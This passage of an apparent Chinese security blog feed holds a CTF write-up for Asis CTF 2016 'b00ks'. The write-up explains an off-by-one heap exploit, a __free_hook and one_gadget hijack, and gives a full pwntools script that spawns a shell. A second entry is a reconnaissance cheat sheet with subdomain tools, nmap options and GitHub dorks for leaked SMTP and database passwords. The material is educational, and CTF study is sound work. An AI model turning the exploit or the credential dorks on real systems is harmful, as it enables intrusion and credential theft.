<p>2.溢出字节为 NULL 字节：在 size 为 0x100 的时候，溢出 NULL 字节可以使得 prev_in_use 位被清，这样前块会被认为是 free 块。（1） 这时可以选择使用 unlink 方法（见 unlink 部分）进行处理。（2） 另外，这时 prev_size 域就会启用，就可以伪造 prev_size ，从而造成块之间发生重叠。此方法的关键在于 unlink 的时候没有检查按照 prev_size 找到的块的大小与prev_size 是否一致。<strong>（<strong><strong>glibc2.28</strong></strong>前版本有效）</strong></p>
<p>下面是ctf例题：</p>
<h2 id="asis-ctf-2016-b00ks"><a class="markdownIt-Anchor" href="#asis-ctf-2016-b00ks"></a> Asis CTF 2016 b00ks</h2>
<h3 id="程序分析-3"><a class="markdownIt-Anchor" href="#程序分析-3"></a> 程序分析</h3>
<p>该程序是64位，开启了nx和pie，注意这里开启了Full RELRO保护，不能进行复写got表的操作，需要考虑劫持之类的操作</p>
 <img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210802115028455.png" alt="image-20210802115028455" style="zoom:80%;">
<p>主函数如下</p>
 <img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210802115046771.png" alt="image-20210802115046771" style="zoom:80%;">
<p>有几个功能，增，删，改，查看，还有个修改authorname的功能，<strong>这个函数在一开始就会调用一次</strong>，而我们的漏洞点就是出在这里。函数内部如下</p>
 <img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210802115104551.png" alt="image-20210802115104551" style="zoom:80%;">
<p>sub_9f5内容</p>
 <img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210802115119997.png" alt="image-20210802115119997" style="zoom:67%;">
<p>可以看到是把我们的输入一个个进行读取，但是这里有一个漏洞，如果我们输入的是32个字节，因为循环是从0开始，当到31的时候我们输入的读取就已经结束了，但是循环还会继续一次，最后会把*buf的第33位置为\x00，这就是off by one的null字节溢出。</p>
<p>新建book的函数</p>
 <img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210802115140653.png" alt="image-20210802115140653" style="zoom:80%;">
<p>要求输入一个name和一个description，name的大小说是最大为32，但是实际上这里并没有检查，可以创建我们想要的大小，description也一样。</p>
<p>Name和description创建完后还会创建一个结构体用来存储book的指针</p>
 <img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210802115429476.png" alt="image-20210802115429476" style="zoom:80%;">
<p>这个结构体大概内容是</p>
<p>0x0 book的id</p>
<p>0x8 book的name的地址</p>
<p>0x10 book的description的地址</p>
<p>0x18 book的size</p>
<p>然后会把这个结构体的指针放在*((_QWORD *)off_202010 + v2)的位置，这个位置实际上就是author_name(off_202018)的位置+0x20的地方，也就是说如果输入了32个字节的author_name，那么最后的\x00就会覆盖到第一个创建的book的低地址。</p>
 <img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210802115447627.png" alt="image-20210802115447627" style="zoom:80%;">
<p>删除函数</p>
<img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210802115530189.png" alt="image-20210802115530189" style="zoom:80%;">
<p>编辑函数，根据off_202010位置存放的结构体指针进行编辑</p>
 <img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210809144352252.png" alt="image-20210809144352252" style="zoom:80%;">
<p>展示book的函数，这里还会把author_name展示出来</p>
 <img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210809144405729.png" alt="image-20210809144405729" style="zoom:80%;">
<p>选项5是和开头一样的修改author_name的函数，就不再展示</p>
<h3 id="利用思路-3"><a class="markdownIt-Anchor" href="#利用思路-3"></a> 利用思路</h3>
<p>1.首先因为author_name紧接着就是book1结构体的地址，如果溢出了一个\x00就会覆盖到book1的结构体地址，，这个后面会用到，因为我们是先输入的name，那么如果先输入32字节的name，再创建book1的话，book1的地址就会覆盖name末尾的截断字符，如果选择5输出了author_name的话，就可以输出book1的地址了。</p>
<p>2.<strong>libc****基址泄露方法</strong></p>
<p>因为题目开启了pie，而且没有特别明显的libc基址泄露，但是这里有一个技巧，如果我们申请的内存块足够大，就会调用mmap来扩展内存，由于调用mmap分配的内存和libc基址的偏移是固定的，我们只要泄露book2分配内存的地址就可以知道libc基址</p>
<p>验证：这里创建book2申请了2个大小0x21000的空间</p>
<p>选择Book2的name存储的地址是  0x00007f9899a27010，libc加载的基址是</p>
<p>0x00007f9899475000，偏移为0x00007f9899a27010-0x00007f9899475000=0x5b2010</p>
 <img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210809144439572.png" alt="image-20210809144439572" style="zoom:80%;">
<p>第二次申请的结果</p>
<p>Name的内存地址是0x00007f4a27340010，libc基址是0x00007f4a26d8e000，偏移为0x00007f4a27340010-0x00007f4a26d8e000=0x5b2010，可以看到2次申请偏移是一样的</p>
 <img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210809144457875.png" alt="image-20210809144457875" style="zoom:80%;">
<p>可以看到这里偏移是一样的</p>
<p>3.<strong>泄露book2****地址的方法</strong></p>
<p>这里可以利用off by one的漏洞，因为我们的选项5可以重新修改一开始设置的author_name，然后让末尾的\x00覆盖掉book1的结构体指针（这里要注意，我们可以修改的区域是book1的name和description，创建book1的时候要让这两个区域能修改到覆盖后的book1的结构体指针），这样就可以在这个区域伪造一个fake chunk，把name和description的指针修改为book2结构体指针的name和description的地址（由于每次申请的结构体是0x20，所以可以通过泄露的book1结构体的地址进行计算），就可以利用printf选项打印出book2申请的name和description的地址了，然后利用这个地址计算libc的基址。</p>
<p>4.<strong>拿到shell</strong></p>
<p>这里需要利用__free_hook函数，<strong>当调用<strong><strong>free</strong></strong>函数的时候__free_hook<strong><strong>函数不为NULL</strong></strong>会优先调用__free_hook****里面所写的内容</strong>，我们可以利用编辑功能把book2的结构体中指向description的指针修改为__free_hook函数，再利用编辑功能编辑book2，修改__free_hook的内容为onegadget的execve(&quot;/bin/sh&quot;, rsp+0x30, environ)，然后执行free book2，当free了book2的description指针的时候就会执行__free_hook里的内容拿到shell。</p>
<h3 id="gdb调试-3"><a class="markdownIt-Anchor" href="#gdb调试-3"></a> Gdb调试</h3>
<p>验证输入author_name的off by one</p>
<p>首先在一开始输入author_name的时候输入32个A，然后创建book1和book2，这里需要用到find命令寻找A存储的地方</p>
 <img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210809144526836.png" alt="image-20210809144526836" style="zoom:80%;">
<p>可以看到book1的地址覆盖了author_name末尾的\x00</p>
 <img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210809145420604.png" alt="image-20210809145420604" style="zoom:80%;">
<p>这时候选择打印功能就会输出book1结构体的内容了</p>
 <img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210809145450859.png" alt="image-20210809145450859" style="zoom:80%;">
<p>然后再次选择修改author_name输入32个A导致了book1结构体地址末尾被覆盖成了\x00（这里重新调试了，可以看到如果分配的内存大小固定的话，重新调试末尾的地址是一样的）</p>
 <img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210809145520725.png" alt="image-20210809145520725" style="zoom:80%;">
<p>这里查看分配的堆快，我们需要把description的区域分配到能够控制到覆盖后的（这里是0x559595831100）的地方，就可以伪造book1结构体的chunk了</p>
 <img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210809145539011.png" alt="image-20210809145539011" style="zoom:80%;">
<p>这里编辑book1的description+0x20的偏移就可以编辑到通过off by one 覆盖的0x559595831100的地方进行伪造chunk了（注意这里需要之前创建description有足够的大小）</p>
<p>然后伪造book1的结构体把name和description的位置写入book2的name和description的结构体指针的地址(相对book1结构体地址的偏移为0x38和0x40)</p>
 <img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210809145655945.png" alt="image-20210809145655945" style="zoom:80%;">
<p>再次选择打印就会打印出book2通过mmap分配的内存的地址了</p>
 <img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210809145720528.png" alt="image-20210809145720528" style="zoom:80%;">
<p>之后的利用就和利用思路一样，利用编辑功能把book2的结构体（这里是伪造book1的description）中指向description的指针修改为__free_hook函数，再利用编辑功能编辑book2，修改__free_hook的内容为onegadget的execve(&quot;/bin/sh&quot;, rsp+0x30, environ)，然后执行free book2，当free了book2的description指针的时候就会执行__free_hook里的内容拿到shell。</p>
 <img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210809145752158.png" alt="image-20210809145752158" style="zoom:80%;">
<h3 id="payload脚本-2"><a class="markdownIt-Anchor" href="#payload脚本-2"></a> Payload脚本</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># encoding=UTF-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>binary=ELF(<span class="hljs-string">&quot;b00ks&quot;</span>)<br>libc=ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc-2.23.so&quot;</span>)<br>p=process(<span class="hljs-string">&quot;./b00ks&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">new</span>(<span class="hljs-params">name_size,name,des_size,des</span>):</span><br>    p.recvuntil(<span class="hljs-string">&quot;&gt; &quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(name_size))<br>    p.recvuntil(<span class="hljs-string">&quot;: &quot;</span>)<br>    p.sendline(name)<br>    p.recvuntil(<span class="hljs-string">&quot;: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(des_size))<br>    p.recvuntil(<span class="hljs-string">&quot;: &quot;</span>)<br>    p.sendline(des)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">printbook</span>():</span><br>    p.recvuntil(<span class="hljs-string">&quot;&gt; &quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;4&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">read_authorname</span>(<span class="hljs-params">name</span>):</span><br>    p.recvuntil(<span class="hljs-string">&quot;&gt; &quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;5&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;: &quot;</span>)<br>    p.sendline(name)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">editbook</span>(<span class="hljs-params">book_id,new_des</span>):</span><br>    p.recvuntil(<span class="hljs-string">&quot;&gt; &quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;3&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;: &quot;</span>)<br>    p.writeline(<span class="hljs-built_in">str</span>(book_id))<br>    p.recvuntil(<span class="hljs-string">&quot;: &quot;</span>)<br>    p.sendline(new_des)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span>(<span class="hljs-params">book_id</span>):</span><br>    p.recvuntil(<span class="hljs-string">&quot;&gt; &quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(book_id))<br><br>p.recvuntil(<span class="hljs-string">&quot;name: &quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">32</span>)<br><span class="hljs-comment">#需要创建满足book1的des区域可以修改到通过off by one修改后的内存区域</span><br>new(<span class="hljs-number">176</span>,<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-number">88</span>,<span class="hljs-string">&quot;a&quot;</span>)<br><br><span class="hljs-comment">#创建2个大的内存区域，使用mmap分配</span><br>new(<span class="hljs-number">0x21000</span>,<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-number">0x21000</span>,<span class="hljs-string">&quot;a&quot;</span>)<br><br><span class="hljs-comment">#gdb.attach(p)</span><br>printbook()<br>p.recvuntil(<span class="hljs-string">&quot;Author: &quot;</span>)<br>book1_addr=u64(p.recvline()[<span class="hljs-number">32</span>:<span class="hljs-number">32</span>+<span class="hljs-number">6</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>log.success(<span class="hljs-string">&quot;book1_address:&quot;</span>+<span class="hljs-built_in">hex</span>(book1_addr))<br><br><span class="hljs-comment">#伪造fake chunk</span><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p64(<span class="hljs-number">1</span>)+p64(book1_addr+<span class="hljs-number">0x38</span>)+p64(book1_addr+<span class="hljs-number">0x40</span>)+p64(<span class="hljs-number">0xffff</span>)<br>editbook(<span class="hljs-number">1</span>,payload)<br><span class="hljs-comment">#gdb.attach(p)</span><br>read_authorname(<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">32</span>)<br><span class="hljs-comment">#gdb.attach(p)</span><br><br>printbook()<br>p.recvuntil(<span class="hljs-string">&quot;Name: &quot;</span>)<br>book2_name_addr=u64(p.recvline()[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&quot;\x00&quot;</span>))<br>p.recvuntil(<span class="hljs-string">&quot;Description: &quot;</span>)<br>book2_des_addr=u64(p.recvline()[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&quot;\x00&quot;</span>))<br>log.success(<span class="hljs-string">&quot;book2 name addr:&quot;</span>+<span class="hljs-built_in">hex</span>(book2_name_addr))<br>log.success(<span class="hljs-string">&quot;book2 des addr:&quot;</span>+<span class="hljs-built_in">hex</span>(book2_des_addr))<br><br><span class="hljs-comment">#用book2的name和des到libc基址的偏移计算libc基址</span><br>libc_base=book2_name_addr-<span class="hljs-number">0x5b2010</span><br>log.success(<span class="hljs-string">&quot;libc base:&quot;</span>+<span class="hljs-built_in">hex</span>(libc_base))<br><span class="hljs-comment">#gdb.attach(p)</span><br>free_hook=libc_base+libc.symbols[<span class="hljs-string">&quot;__free_hook&quot;</span>]<br>one_gadget=libc_base+<span class="hljs-number">0x4527a</span> <br>log.success(<span class="hljs-string">&quot;free_hook:&quot;</span>+<span class="hljs-built_in">hex</span>(free_hook))<br>log.success(<span class="hljs-string">&quot;one_gadget:&quot;</span>+<span class="hljs-built_in">hex</span>(one_gadget))<br><br><span class="hljs-comment">#修改book2的des为free_hook的地址，然后把内容改为one_gadget</span><br>editbook(<span class="hljs-number">1</span>,p64(free_hook))<br>editbook(<span class="hljs-number">2</span>,p64(one_gadget))<br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#进行free的操作调用free_hook劫持</span><br><br>delete(<span class="hljs-number">2</span>)<br>p.interactive()<br><br></code></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>PWN学习</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>PWN学习</tag>
      </tags>
  </entry>
  <entry>
    <title>信息收集</title>
    <url>/2021/07/28/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    <content><![CDATA[<h1 id="信息收集"><a class="markdownIt-Anchor" href="#信息收集"></a> 信息收集</h1>
<h2 id="1-厂商信息收集"><a class="markdownIt-Anchor" href="#1-厂商信息收集"></a> 1.  厂商信息收集</h2>
<h3 id="11资产查询"><a class="markdownIt-Anchor" href="#11资产查询"></a> 1.1资产查询</h3>
<p>启信宝： 启信宝-企业查询企业信用信息平台 (<a href="http://qixin.com">qixin.com</a>)<br>
天眼查：天眼查-商业查询平台企业信息查询公司查询工商查询企业信用信息系统 (<a href="http://tianyancha.com">tianyancha.com</a>)<br>
企查查：企查查-企业工商信息查询系统查企业查老板查风险就上企查查!(<a href="http://qcc.com">qcc.com</a>)<br>
方法：主要通过这些查询网站查询产商的信息：网站域名、app、小程序、子公司、员工信息等。<br>
例：使用企查查，点击知识产权处可以查看到该公司备案号网站和app</p>
<p><img src="/2021/07/28/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%9B%BE%E7%89%871.png" alt="图片1"></p>
<p>七麦数据 <a href="https://www.qimai.cn/">https://www.qimai.cn/</a></p>
<p>可以查询一些app信息</p>
<p><img src="/2021/07/28/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210903152952582.png" alt="image-20210903152952582"></p>
<h2 id="12-app域名信息收集"><a class="markdownIt-Anchor" href="#12-app域名信息收集"></a> 1.2 APP域名信息收集</h2>
<h3 id="github-kelvinbenappinfoscanner"><a class="markdownIt-Anchor" href="#github-kelvinbenappinfoscanner"></a> GitHub - kelvinBen/AppInfoScanner:</h3>
<p>一款适用于以HW行动/红队/渗透测试团队为场景的移动端(Android、iOS、WEB、H5、静态网站)信息收集扫描工具（<a href="https://github.com/kelvinBen/AppInfoScanner%EF%BC%89">https://github.com/kelvinBen/AppInfoScanner）</a></p>
<p>基本命令：python3 <a href="http://app.py">app.py</a> android -i app路径</p>
<p>python3 <a href="http://app.py">app.py</a> web -i web路径</p>
<p><img src="/2021/07/28/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210903153148837.png" alt="image-20210903153148837"></p>
<h2 id="13资产归属判断"><a class="markdownIt-Anchor" href="#13资产归属判断"></a> 1.3资产归属判断</h2>
<h3 id="whois查询"><a class="markdownIt-Anchor" href="#whois查询"></a> Whois查询</h3>
<h3 id="玉米网httpwwwyumicomtoolwhoismorehtml"><a class="markdownIt-Anchor" href="#玉米网httpwwwyumicomtoolwhoismorehtml"></a> 玉米网（<a href="http://www.yumi.com/tool/whois/more.html%EF%BC%89">http://www.yumi.com/tool/whois/more.html）</a></h3>
<p><img src="/2021/07/28/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210903153258530.png" alt="image-20210903153258530"></p>
<h3 id="站长之家httpwhoischinazcom"><a class="markdownIt-Anchor" href="#站长之家httpwhoischinazcom"></a> 站长之家（<a href="http://whois.chinaz.com/%EF%BC%89">http://whois.chinaz.com/）</a></h3>
<p><img src="/2021/07/28/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210903153454946.png" alt="image-20210903153454946"></p>
<h2 id="14备案信息查询"><a class="markdownIt-Anchor" href="#14备案信息查询"></a> 1.4备案信息查询</h2>
<h3 id="icp备案查询httpsbeianmiitgovcn"><a class="markdownIt-Anchor" href="#icp备案查询httpsbeianmiitgovcn"></a> ICP备案查询（<a href="https://beian.miit.gov.cn">https://beian.miit.gov.cn</a>）</h3>
<h3 id="站长之家-icp备案查询-站长工具-chinazcom"><a class="markdownIt-Anchor" href="#站长之家-icp备案查询-站长工具-chinazcom"></a> 站长之家 <a href="http://icp.chinaz.com/">ICP备案查询 - 站长工具 (chinaz.com)</a></h3>
<h2 id="15指纹识别收集"><a class="markdownIt-Anchor" href="#15指纹识别收集"></a> 1.5指纹识别收集</h2>
<h4 id="railgun工具"><a class="markdownIt-Anchor" href="#railgun工具"></a> Railgun工具</h4>
<p><a href="https://github.com/lz520520/railgun">lz520520/railgun (github.com)</a></p>
<p><img src="/2021/07/28/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20210903154013613.png" alt="image-20210903154013613"></p>
<h3 id="在线指纹识别-whatwebhttpwhatwebbugscanercomlook"><a class="markdownIt-Anchor" href="#在线指纹识别-whatwebhttpwhatwebbugscanercomlook"></a> 在线指纹识别  Whatweb：<a href="http://whatweb.bugscaner.com/look/">http://whatweb.bugscaner.com/look/</a></h3>
<h3 id="tidefinger"><a class="markdownIt-Anchor" href="#tidefinger"></a> TideFinger</h3>
<p>使用方式：python3 <a href="http://TideFinger.py">TideFinger.py</a> -u <a href="http://www.123.com">http://www.123.com</a> [-p 1] [-m</p>
<h2 id="16网络空间搜索引擎"><a class="markdownIt-Anchor" href="#16网络空间搜索引擎"></a> 1.6网络空间搜索引擎</h2>
<h3 id="fofa"><a class="markdownIt-Anchor" href="#fofa"></a> Fofa</h3>
<p><a href="https://fofa.so/">https://fofa.so/</a></p>
<p>查询语法：</p>
<p><a href="https://fofa.so/help_articles/list?id=8#%E6%9F%A5%E8%AF%A2%E8%AF%AD%E6%B3%955">https://fofa.so/help_articles/list?id=8#查询语法5</a></p>
<h3 id="zoomeye"><a class="markdownIt-Anchor" href="#zoomeye"></a> Zoomeye</h3>
<p><a href="https://www.zoomeye.org/">https://www.zoomeye.org/</a></p>
<h3 id="shodan"><a class="markdownIt-Anchor" href="#shodan"></a> Shodan</h3>
<p><a href="https://www.shodan.io/">https://www.shodan.io/</a></p>
<h3 id="斗象资产情报"><a class="markdownIt-Anchor" href="#斗象资产情报"></a> ⽃象资产情报</h3>
<p><a href="https://arl.riskivy.com/">https://arl.riskivy.com/</a></p>
<p>![图形用户界面, 应用程序, 网站  描述已自动生成](file:///C:/Users/17473/AppData/Local/Temp/msohtmlclip1/01/clip_image024.png</p>
<h1 id="2子域名枚举"><a class="markdownIt-Anchor" href="#2子域名枚举"></a> 2.子域名枚举</h1>
<h2 id="21在线子域名查询网站"><a class="markdownIt-Anchor" href="#21在线子域名查询网站"></a> 2.1在线子域名查询网站</h2>
<p>在线爆破 <a href="https://phpinfo.me/domain/">https://phpinfo.me/domain/</a></p>
<h2 id="22爆破工具"><a class="markdownIt-Anchor" href="#22爆破工具"></a> 2.2爆破工具</h2>
<h3 id="subdomainsbrute"><a class="markdownIt-Anchor" href="#subdomainsbrute"></a> subDomainsBrute</h3>
<p><a href="https://github.com/lijiejie/subDomainsBrute">lijiejie/subDomainsBrute: A fast sub domain brute tool for pentesters (github.com)</a></p>
<p>可以和goby配合使用</p>
<img src="/2021/07/28/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/clip_image026.png" alt="图形用户界面, 文本, 应用程序  描述已自动生成" style="zoom: 67%;">
<h3 id="oneforall-一款功能强大的子域收集工具"><a class="markdownIt-Anchor" href="#oneforall-一款功能强大的子域收集工具"></a> OneForAll <strong>一款功能强大的子域收集工具</strong></h3>
<p><a href="https://github.com/shmilylty/OneForAll">shmilylty/OneForAll: OneForAll是一款功能强大的子域收集工具 (github.com)</a></p>
<p>基本使用命令：</p>
<p>python3 <a href="http://oneforall.py">oneforall.py</a> --target <a href="http://example.com">example.com</a> run</p>
<p>python3 <a href="http://oneforall.py">oneforall.py</a> --targets ./example.txt run</p>
<h3 id="水泽-信息收集自动化工具"><a class="markdownIt-Anchor" href="#水泽-信息收集自动化工具"></a> 水泽-信息收集自动化工具</h3>
<p><a href="https://github.com/0x727/ShuiZe_0x727">0x727/ShuiZe_0x727: 信息收集自动化工具 (github.com)</a></p>
<p><strong>使用方法</strong></p>
<p>python3 <a href="http://ShuiZe.py">ShuiZe.py</a> -d <a href="http://domain.com">domain.com</a>   收集单一的根域名资产</p>
<p>python3 <a href="http://ShuiZe.py">ShuiZe.py</a> --domainFile domain.txt  批量跑根域名列表</p>
<p>python3 <a href="http://ShuiZe.py">ShuiZe.py</a> -c 192.168.1.0,192.168.2.0,192.168.3.0  收集C段资产</p>
<p>python3 <a href="http://ShuiZe.py">ShuiZe.py</a> -f url.txt 对url里的网站漏洞检测</p>
<p>python3 <a href="http://ShuiZe.py">ShuiZe.py</a> -d <a href="http://domain.com">domain.com</a> --justInfoGather 1  仅信息收集，不检测漏洞</p>
<p>python3 <a href="http://ShuiZe.py">ShuiZe.py</a> -d <a href="http://domain.com">domain.com</a> --ksubdomain 0        不调用ksubdomain爆破子域名</p>
<h2 id="3-ip查询"><a class="markdownIt-Anchor" href="#3-ip查询"></a> 3. ip查询</h2>
<h3 id="31-dns解析记录查真实ip"><a class="markdownIt-Anchor" href="#31-dns解析记录查真实ip"></a> 3.1 dns解析记录（查真实ip）</h3>
<p><a href="http://www.siteinfotool.com/">http://www.siteinfotool.com/</a></p>
<p><a href="http://toolbar.netcraft.com/site_report">http://toolbar.netcraft.com/site_report</a></p>
<p><a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a></p>
<p><a href="https://viewdns.info/iphistory/">https://viewdns.info/iphistory/</a></p>
<p><a href="https://asm.ca.com/">https://asm.ca.com/</a></p>
<p>或使用网络空间搜索引擎查询站点</p>
<h2 id="32-c段查询"><a class="markdownIt-Anchor" href="#32-c段查询"></a> 3.2 C段查询</h2>
<h3 id="c段查询归属"><a class="markdownIt-Anchor" href="#c段查询归属"></a> C段查询归属</h3>
<p><a href="http://ipwhois.cnnic.net.cn/">http://ipwhois.cnnic.net.cn/</a></p>
<p><a href="https://www.ip138.com/">iP地址查询–手机号码查询归属地 | 邮政编码查询 | iP地址归属地查询 | 身份证号码验证在线查询网 (ip138.com)</a></p>
<h2 id="33-旁站查询在同一服务器上"><a class="markdownIt-Anchor" href="#33-旁站查询在同一服务器上"></a> 3.3 旁站查询（在同一服务器上）</h2>
<p>站长之家：</p>
<p><a href="http://stool.chinaz.com/same">http://stool.chinaz.com/same</a></p>
<p><a href="https://pentest.gdpcisa.org/getdomain">旁站/C段 - 渗透测试工具箱 (gdpcisa.org)</a></p>
<h2 id="34-ip反查域名"><a class="markdownIt-Anchor" href="#34-ip反查域名"></a> 3.4 IP反查域名</h2>
<p><a href="https://dns.aizhan.com/">https://dns.aizhan.com/</a></p>
<h1 id="4主机发现端口信息收集"><a class="markdownIt-Anchor" href="#4主机发现端口信息收集"></a> 4.主机发现/端口信息收集</h1>
<h2 id="nmap"><a class="markdownIt-Anchor" href="#nmap"></a> Nmap</h2>
<p>官网：<a href="https://nmap.org/">https://nmap.org/</a></p>
<p>安装：</p>
<p><strong>Mac os: brew install nmap</strong></p>
<p><strong>Centos: yum install nmap</strong></p>
<p><strong>Ubuntu: apt-get install nmap</strong></p>
<p><strong>扫描方式</strong></p>
<p><strong>TCP : -sT</strong></p>
<p><strong>SYN : -sS</strong></p>
<p><strong>ACK : -sA</strong></p>
<p><strong>UDP : -sU</strong></p>
<p><strong>RPC : -sR</strong></p>
<p><strong>ICMP: -sP</strong></p>
<p><strong>Disable Port Scan: -sn</strong></p>
<p><strong>常见扫描方案</strong></p>
<p><strong>扫描10000****端口、操作系统、版本</strong></p>
<p><strong>nmap -T4 -A <Target></Target></strong></p>
<p><strong>版本探测</strong></p>
<p><strong>nmap -sV <Target></Target></strong></p>
<p><strong>操作系统</strong></p>
<p><strong>nmap -O <Target></Target></strong></p>
<h2 id="goby"><a class="markdownIt-Anchor" href="#goby"></a> Goby</h2>
<p>Goby可以一键扫描资产中的端口，自动分类资产类型</p>
<h1 id="5github-信息收集"><a class="markdownIt-Anchor" href="#5github-信息收集"></a> 5.Github 信息收集</h1>
<p>可以在所有公共GitHub存储库中搜索以下类型的信息，以及您有权访问的所有私有GitHub存储库</p>
<p>搜索代码：</p>
<p>in:name test       #仓库标题搜索含有关键字test</p>
<p>in:descripton test     #仓库描述搜索含有关键字</p>
<p>in:readme test      #Readme文件搜素含有关键字</p>
<p>stars:&gt;3000 test     #stars数量大于3000的搜索关键字</p>
<p>stars:1000…3000 test  #stars数量大于1000小于3000的搜索关键字</p>
<p>forks:&gt;1000 test      #forks数量大于1000的搜索关键字</p>
<p>forks:1000…3000 test  #forks数量大于1000小于3000的搜索关键字</p>
<p>size:&gt;=5000 test      #指定仓库大于5000k(5M)的搜索关键字</p>
<p>pushed:&gt;2019-02-12 test  #发布时间大于2019-02-12的搜索关键字</p>
<p>created:&gt;2019-02-12 test  #创建时间大于2019-02-12的搜索关键字</p>
<p>user:test         #用户名搜素</p>
<p>license:apache-2.0 test  #明确仓库的 LICENSE 搜索关键字</p>
<p>language:java test     #在java语言的代码中搜索关键字</p>
<p>user:test in:name test   #组合搜索,用户名test的标题含有test的</p>
<p>使用 Github 进行邮件配置信息收集：（此处配合google使用）</p>
<p>site:Github.com smtp</p>
<p>site:Github.com smtp @qq.com</p>
<p>site:Github.com smtp @126.com</p>
<p>site:Github.com smtp @163.com</p>
<p>site:Github.com smtp @sina.com.cn</p>
<p>site:Github.com smtp password</p>
<p>site:Github.com String password smtp</p>
<p>使用Github进行数据库信息收集：（此处配合google使用）</p>
<p>site:Github.com sa password</p>
<p>site:Github.com root password</p>
<p>site:Github.com User ID=’sa’;Password</p>
<p>site:Github.com inurl:sql</p>
